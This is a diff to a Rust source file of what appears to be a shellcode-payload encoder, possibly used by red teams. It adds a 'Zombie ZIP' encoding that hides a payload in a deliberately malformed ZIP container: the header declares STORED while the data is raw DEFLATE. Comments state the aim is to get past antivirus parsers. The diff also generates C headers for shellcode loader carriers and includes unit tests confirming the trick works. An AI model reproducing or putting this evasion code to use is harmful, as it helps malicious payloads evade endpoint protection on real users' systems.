@@ -7,7 +7,10 @@
 //!   - English: Dictionary-based word mapping (low entropy)
 
 use anyhow::{Result, bail};
+use flate2::Compression;
+use flate2::write::DeflateEncoder;
 use std::collections::HashMap;
+use std::io::Write;
 
 /// Encoding type for payload
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
@@ -21,6 +24,8 @@ pub enum EncodingType {
     None,
     /// Sub-byte nibble mapping (4-bit split, 16-entry lookup table)
     SubByte,
+    /// Zombie ZIP — malformed ZIP container (method=STORED, data=raw DEFLATE)
+    ZombieZip,
 }
 
 impl std::str::FromStr for EncodingType {
@@ -32,8 +37,9 @@ impl std::str::FromStr for EncodingType {
             "english" => Ok(Self::English),
             "none" => Ok(Self::None),
             "subbyte" | "sub_byte" | "nibble" => Ok(Self::SubByte),
+            "zombiezip" | "zombie_zip" | "zombie-zip" | "zzip" => Ok(Self::ZombieZip),
             other => bail!(
-                "Unknown encoding type: '{}'. Valid: xor, english, none, subbyte",
+                "Unknown encoding type: '{}'. Valid: xor, english, none, subbyte, zombiezip",
                 other
             ),
         }
@@ -48,6 +54,7 @@ impl EncodingType {
             Self::English => "english",
             Self::None => "none",
             Self::SubByte => "subbyte",
+            Self::ZombieZip => "zombie_zip",
         }
     }
 }
@@ -131,6 +138,7 @@ impl PayloadEncoder {
             EncodingType::English => self.encode_english(payload),
             EncodingType::None => Self::encode_none(payload),
             EncodingType::SubByte => self.encode_subbyte(payload),
+            EncodingType::ZombieZip => Self::encode_zombiezip(payload),
         }
     }
 
@@ -220,6 +228,7 @@ impl PayloadEncoder {
             EncodingType::English => self.generate_english_header(encoded),
             EncodingType::None => Self::generate_none_header(encoded),
             EncodingType::SubByte => self.generate_subbyte_header(encoded),
+            EncodingType::ZombieZip => Self::generate_zombiezip_header(encoded),
         }
     }
 
@@ -309,6 +318,130 @@ unsigned char supermega_payload[1] = {{ 0 }};
         )
     }
 
+    /// Zombie ZIP encode — wraps payload in a malformed ZIP container.
+    ///
+    /// The ZIP local file header declares `method=0` (STORED) but the data is
+    /// raw DEFLATE compressed. AV engines that trust the method field see random
+    /// "stored" bytes and detect nothing. The CRC-32 is set to the uncompressed
+    /// payload's checksum so compliant parsers that check CRC will flag it, but
+    /// most AV ZIP parsers don't cross-check method vs. data.
+    ///
+    /// **Carrier compatibility:** Requires carriers that allocate a separate
+    /// destination buffer (`alloc_rw_rx`, `peb_walk`). In-place carriers like
+    /// `change_rw_rx` will corrupt data because source and destination overlap.
+    fn encode_zombiezip(payload: &[u8]) -> EncodedPayload {
+        let crc = crc32fast::hash(payload);
+        let uncompressed_size = payload.len() as u32;
+
+        // Raw DEFLATE compress (no zlib/gzip header)
+        let mut encoder = DeflateEncoder::new(Vec::new(), Compression::best());
+        encoder.write_all(payload).expect("DEFLATE write failed");
+        let compressed = encoder.finish().expect("DEFLATE finish failed");
+        let compressed_size = compressed.len() as u32;
+
+        let filename = b"data.bin";
+        let filename_len = filename.len() as u16;
+
+        let mut zip = Vec::new();
+
+        // --- Local file header (30 bytes + filename) ---
+        zip.extend_from_slice(&0x04034b50u32.to_le_bytes()); // Local file header signature
+        zip.extend_from_slice(&20u16.to_le_bytes()); // Version needed to extract
+        zip.extend_from_slice(&0u16.to_le_bytes()); // General purpose bit flag
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Compression method: 0 = STORED (the lie)
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file time
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file date
+        zip.extend_from_slice(&crc.to_le_bytes()); // CRC-32 (of uncompressed data)
+        zip.extend_from_slice(&compressed_size.to_le_bytes()); // Compressed size
+        zip.extend_from_slice(&uncompressed_size.to_le_bytes()); // Uncompressed size
+        zip.extend_from_slice(&filename_len.to_le_bytes()); // File name length
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Extra field length
+
+        zip.extend_from_slice(filename);
+
+        let data_offset = zip.len(); // 30 + filename_len = 38
+
+        // --- File data (raw DEFLATE bytes) ---
+        zip.extend_from_slice(&compressed);
+
+        // --- Central directory header (46 bytes + filename) ---
+        let cd_offset = zip.len() as u32;
+        zip.extend_from_slice(&0x02014b50u32.to_le_bytes()); // Central directory signature
+        zip.extend_from_slice(&20u16.to_le_bytes()); // Version made by
+        zip.extend_from_slice(&20u16.to_le_bytes()); // Version needed to extract
+        zip.extend_from_slice(&0u16.to_le_bytes()); // General purpose bit flag
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Compression method: 0 = STORED
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file time
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Last mod file date
+        zip.extend_from_slice(&crc.to_le_bytes()); // CRC-32
+        zip.extend_from_slice(&compressed_size.to_le_bytes()); // Compressed size
+        zip.extend_from_slice(&uncompressed_size.to_le_bytes()); // Uncompressed size
+        zip.extend_from_slice(&filename_len.to_le_bytes()); // File name length
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Extra field length
+        zip.extend_from_slice(&0u16.to_le_bytes()); // File comment length
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Disk number start
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Internal file attributes
+        zip.extend_from_slice(&0u32.to_le_bytes()); // External file attributes
+        zip.extend_from_slice(&0u32.to_le_bytes()); // Relative offset of local header
+
+        zip.extend_from_slice(filename);
+
+        // --- End of central directory record (22 bytes) ---
+        let cd_size = (zip.len() as u32) - cd_offset;
+        zip.extend_from_slice(&0x06054b50u32.to_le_bytes()); // EOCD signature
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Number of this disk
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Disk where CD starts
+        zip.extend_from_slice(&1u16.to_le_bytes()); // Number of CD records on this disk
+        zip.extend_from_slice(&1u16.to_le_bytes()); // Total number of CD records
+        zip.extend_from_slice(&cd_size.to_le_bytes()); // Size of central directory
+        zip.extend_from_slice(&cd_offset.to_le_bytes()); // Offset of start of CD
+        zip.extend_from_slice(&0u16.to_le_bytes()); // Comment length
+
+        let mut metadata = HashMap::new();
+        metadata.insert("original_len".to_string(), payload.len().to_string());
+        metadata.insert("compressed_len".to_string(), compressed.len().to_string());
+        metadata.insert("data_offset".to_string(), data_offset.to_string());
+        metadata.insert("crc32".to_string(), format!("0x{:08X}", crc));
+
+        EncodedPayload {
+            encoding: EncodingType::ZombieZip,
+            data: zip,
+            metadata,
+        }
+    }
+
+    /// Generate C header for Zombie ZIP encoded payload
+    fn generate_zombiezip_header(encoded: &EncodedPayload) -> String {
+        let original_len: usize = encoded.metadata["original_len"].parse().unwrap();
+        let compressed_len: usize = encoded.metadata["compressed_len"].parse().unwrap();
+        let data_offset: usize = encoded.metadata["data_offset"].parse().unwrap();
+        let array = format_c_byte_array(&encoded.data);
+
+        format!(
+            r#"/* Auto-generated payload header - Zombie ZIP encoding */
+#ifndef PAYLOAD_H
+#define PAYLOAD_H
+#define ZOMBIEZIP_ENCODING
+
+#define PAYLOAD_LEN {original_len}
+#define ZOMBIEZIP_CONTAINER_LEN {container_len}
+#define ZOMBIEZIP_DATA_OFFSET {data_offset}
+#define ZOMBIEZIP_COMPRESSED_LEN {compressed_len}
+
+unsigned char supermega_payload[ZOMBIEZIP_CONTAINER_LEN] = {{
+{array}
+}};
+
+#endif /* PAYLOAD_H */
+"#,
+            original_len = original_len,
+            container_len = encoded.data.len(),
+            data_offset = data_offset,
+            compressed_len = compressed_len,
+            array = array,
+        )
+    }
+
     /// Generate C header for sub-byte nibble-mapped payload
     fn generate_subbyte_header(&self, encoded: &EncodedPayload) -> String {
         let original_len: usize = encoded.metadata["original_len"].parse().unwrap();
@@ -391,6 +524,8 @@ pub fn generate_test_payload(size: usize) -> Vec<u8> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use flate2::read::DeflateDecoder;
+    use std::io::Read as _;
     use std::str::FromStr;
 
     #[test]
@@ -488,5 +623,102 @@ mod tests {
         assert_eq!(payload[0], 0x90); // NOP
         assert_eq!(payload[8], 0xCC); // INT3
         assert_eq!(payload[9], 0xCC); // INT3
+    }
+
+    #[test]
+    fn test_zombiezip_encoding_type_parsing() {
+        for name in &[
+            "zombiezip",
+            "zombie_zip",
+            "zombie-zip",
+            "zzip",
+            "ZombieZip",
+            "ZOMBIEZIP",
+        ] {
+            assert_eq!(
+                EncodingType::from_str(name).unwrap(),
+                EncodingType::ZombieZip,
+                "Failed to parse '{}'",
+                name
+            );
+        }
+    }
+
+    #[test]
+    fn test_zombiezip_produces_valid_zip_structure() {
+        let encoder = PayloadEncoder::new();
+        let payload = vec![0x90; 64];
+        let encoded = encoder.encode(&payload, EncodingType::ZombieZip);
+
+        // ZIP local file header signature: PK\x03\x04
+        assert_eq!(&encoded.data[0..4], &[0x50, 0x4B, 0x03, 0x04]);
+
+        // Required metadata keys present
+        assert!(encoded.metadata.contains_key("original_len"));
+        assert!(encoded.metadata.contains_key("compressed_len"));
+        assert!(encoded.metadata.contains_key("data_offset"));
+        assert!(encoded.metadata.contains_key("crc32"));
+
+        assert_eq!(encoded.metadata["original_len"], "64");
+    }
+
+    #[test]
+    fn test_zombiezip_method_field_is_stored() {
+        let encoder = PayloadEncoder::new();
+        let payload = vec![0xDE, 0xAD, 0xBE, 0xEF];
+        let encoded = encoder.encode(&payload, EncodingType::ZombieZip);
+
+        // Compression method is at offset 8-9 in the local file header
+        // Method = 0 (STORED) — the core "lie" of the Zombie ZIP technique
+        assert_eq!(encoded.data[8], 0x00);
+        assert_eq!(encoded.data[9], 0x00);
+    }
+
+    #[test]
+    fn test_zombiezip_roundtrip() {
+        let encoder = PayloadEncoder::new();
+        let original = vec![0x41, 0x42, 0x43, 0x44, 0x90, 0x90, 0xCC, 0xCC];
+        let encoded = encoder.encode(&original, EncodingType::ZombieZip);
+
+        let data_offset: usize = encoded.metadata["data_offset"].parse().unwrap();
+        let compressed_len: usize = encoded.metadata["compressed_len"].parse().unwrap();
+
+        // Extract the raw DEFLATE data from the ZIP container
+        let compressed_data = &encoded.data[data_offset..data_offset + compressed_len];
+
+        // Decompress using flate2
+        let mut decoder = DeflateDecoder::new(compressed_data);
+        let mut decompressed = Vec::new();
+        decoder.read_to_end(&mut decompressed).unwrap();
+
+        assert_eq!(original, decompressed);
+    }
+
+    #[test]
+    fn test_zombiezip_c_header_generation() {
+        let encoder = PayloadEncoder::new();
+        let payload = vec![0x90; 32];
+        let encoded = encoder.encode(&payload, EncodingType::ZombieZip);
+        let header = encoder.generate_c_header(&encoded);
+
+        assert!(header.contains("#define ZOMBIEZIP_ENCODING"));
+        assert!(header.contains("#define PAYLOAD_LEN 32"));
+        assert!(header.contains("#define ZOMBIEZIP_CONTAINER_LEN"));
+        assert!(header.contains("#define ZOMBIEZIP_DATA_OFFSET"));
+        assert!(header.contains("#define ZOMBIEZIP_COMPRESSED_LEN"));
+        assert!(header.contains("supermega_payload[ZOMBIEZIP_CONTAINER_LEN]"));
+        assert!(header.contains("Zombie ZIP encoding"));
+    }
+
+    #[test]
+    fn test_zombiezip_deterministic() {
+        let encoder = PayloadEncoder::new();
+        let payload = vec![0x90; 128];
+
+        let a = encoder.encode(&payload, EncodingType::ZombieZip);
+        let b = encoder.encode(&payload, EncodingType::ZombieZip);
+
+        assert_eq!(a.data, b.data);
+        assert_eq!(a.metadata, b.metadata);
     }
 }
